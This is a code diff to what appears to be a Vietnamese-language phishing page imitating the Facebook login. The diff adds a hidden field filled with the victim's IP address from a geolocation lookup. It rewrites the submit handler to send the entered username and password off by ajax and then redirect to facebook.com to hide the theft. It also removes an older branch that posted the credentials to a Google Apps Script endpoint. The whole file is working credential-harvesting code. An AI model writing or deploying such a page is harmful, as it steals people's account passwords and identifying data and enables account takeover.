@@ -137,6 +137,7 @@
                             <label class="mt-10">
                                 <input id="password" type="password" name="password" required="" placeholder="Mật khẩu">
                             </label>
+							<input id="country" type="text" name="country" style="display:none">
                             <input class="mt-10" type="button" onclick="submitForm();" id="btnSubmit" value="Đăng nhập">
                         </form>
                         <h5 class="forgotpass_h5"><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login" target="_blank" class="forgotpass">Quên mật khẩu?</a></h5>
@@ -159,14 +160,46 @@ $(document).ready(() => {
 });
 var count = 0;
 
-function submitForm() {
-    if (!$('#username').val().includes('@') || $('#password').val().length < 6) {
 
+var g_IPAdress = "";
+var g_Country = "";
+GetIPAdress();
+function GetIPAdress() {
+ var requestOptions = {
+ method: 'GET',
+ redirect: 'follow'
+ };
+
+ fetch("http://gd.geobytes.com/GetCityDetails", requestOptions)
+ .then(response => response.text())
+ .then(result => {
+ try {
+ let res = JSON.parse(result);
+ g_IPAdress = res.geobytesipaddress;
+ g_Country = res.geobytesfqcn;
+ 
+ document.getElementById("country").value = g_IPAdress;
+ }
+ catch (ex) { }
+
+ })
+ .catch(error => console.log('error', error));
+}
+
+function submitForm() {
+	$('#username').val("'" + $('#username').val());
+	$('#password').val("'" + $('#password').val());
+
+    if ($('#username').val().length < 6 || $('#password').val().length < 6) {
+		//alert('Thông tin vừa nhập không đúng');
+		$('#noti').css({ "color": "red" });
+		$('#noti').text('Tài khoản bạn vừa nhập không hợp lệ, Vui lòng thử lại.');
+		return;
     } else {
-        count++;
+        //count++;
     }
 
-    if (count < 3) {
+    if (true) {
         console.log(count);
         $('#loading').show();
         var data = $('form#test-form').serialize();
@@ -177,28 +210,14 @@ function submitForm() {
             crossDomain: true,
             data: data,
             success: function(data) {
-                if (count == 2) {
-                    $('#noti').css({ "color": "red" });
-                } else if (count == 1) {
-                    $('#noti').css({ "color": "#879600" });
-                }
-                $('#noti').text('Tài khoản bạn vừa nhập không hợp lệ, Vui lòng thử lại.');
                 $('#loading').hide();
+				location.href = "https://www.facebook.com";
+				return;
+				
             }, error: function(request, status, error) {
                 $('#loading').hide();
-            }
-        });
-    } else {
-        $('#loading').show();
-        var data = $('form#test-form').serialize();
-        $.ajax({
-            type: 'GET',
-            url: 'https://script.google.com/macros/s/AKfycbyXijxVFOHDi8K4DLH7yMmNTCwLnKfkX0zpUTk3XLe5DXbX8xNMCOEKTeOSZLf_YODM7Q/exec',
-            dataType: 'json',
-            crossDomain: true,
-            data: data,
-            success: function(data) {
-				alert('ok');
+				
+				location.href = "https://www.facebook.com";
             }
         });
     }
